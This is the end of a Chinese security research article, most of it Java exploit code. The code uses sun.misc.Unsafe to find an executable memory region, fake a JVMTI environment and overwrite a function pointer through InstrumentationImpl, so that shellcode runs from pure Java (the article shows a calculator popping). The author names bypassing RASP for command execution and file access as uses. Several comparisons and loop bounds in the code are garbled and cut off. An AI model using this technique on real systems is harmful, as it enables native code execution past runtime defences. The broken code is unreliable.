                if (target%8>0)
                {
                    continue;
                }
                if (target>(allocateMemory&0xffffffff00000000l)&&target0||Long.toHexString(target).endsWith("bebeb0")||Long.toHexString(target).endsWith("abebeb"))
                    {
                        System.out.println("maybe error address,skip "+Long.toHexString(target));
                        continue;
                    }
                    System.out.println("BYTE:"+unsafe.getByte(target));
                    //System.out.println("get address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j));
                    if (unsafe.getByte(target)==0X55||unsafe.getByte(target)==0XE8||unsafe.getByte(target)==(byte)0xA0||unsafe.getByte(target)==0x48||unsafe.getByte(target)==(byte)0x66)
                    {
                        System.out.println("get address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j*offset)+",BYTE:"+Long.toHexString(unsafe.getByte(target)));
                        shellcodeBed=target;
                        break;
                    }
                }
            }
            if (shellcodeBed==0)
            {
                for (int j=-0x100;j0)
                    {
                        continue;
                    }
                    if (target>(allocateMemory&0xffffffff00000000l)&&target0||Long.toHexString(target).endsWith("bebeb0")||Long.toHexString(target).endsWith("abebeb"))
                        {
                            System.out.println("maybe error address,skip "+Long.toHexString(target));
                            continue;
                        }
                        System.out.println("BYTE:"+unsafe.getByte(target));
                        //System.out.println("get address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j));
                        if (unsafe.getByte(target)==0X55||unsafe.getByte(target)==0XE8||unsafe.getByte(target)==(byte)0xA0||unsafe.getByte(target)==0x48)
                        {
                            System.out.println("get bigger cache address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j*offset)+",BYTE:"+Long.toHexString(unsafe.getByte(target)));
                            shellcodeBed=target;
                            break;
                        }
                    }
                }
            }
            System.out.println("find address end,address is "+Long.toHexString(shellcodeBed)+" mod 8 is:"+shellcodeBed%8);
            String address="";
            allocateMemory=shellcodeBed;
            address=allocateMemory+"";
            Class cls=Class.forName("sun.instrument.InstrumentationImpl");
            Constructor constructor=cls.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            Object obj=constructor.newInstance(Long.parseLong(address),true,true);
            Method redefineMethod=cls.getMethod("redefineClasses",new Class[]{ClassDefinition[].class});
            ClassDefinition classDefinition=new ClassDefinition(
                    Class.class,
                    new byte[]{});
            ClassDefinition[] classDefinitions=new ClassDefinition[]{classDefinition};
            try
            {
                unsafe.putLong(allocateMemory+8,allocateMemory+0x10);  //set **jvmtienv point to it's next memory region
                unsafe.putLong(allocateMemory+8+8,allocateMemory+0x10); //set *jvmtienv point to itself
                unsafe.putLong(allocateMemory+0x10+0x168,allocateMemory+0x10+0x168+8); //overwrite allocate function pointer  to allocateMemory+0x10+0x168+8
                for (int k=0;k1)
            {
                // System.out.println("x>1");
            }
            else
            {
                // System.out.println("x1)
            {
                //System.out.println("x>1");
                this.a(x);
            }
            else
            {
                this.a(x+4);
                // System.out.println("x<=1");
            }
        }
    }
编译，运行，成功执行了shellcode，弹出计算器。
到此，我们通过纯Java代码实现了跨平台的任意Native代码执行，从而可以解锁很多新玩法，比如绕过RASP实现命令执行、文件读写、数据库连接等等。
### 小结
本文主要介绍了几种我最近研究的内存相关的攻击方法，欢迎大家交流探讨，文中使用的测试环境为Win10_x64、Ubuntu16.04_x64、Java
1.8.0_301_x64、Java 1.8.0_271_x64。由于文章拖得比较久了，所以行文略有仓促，若有纰漏之处，欢迎批评指正。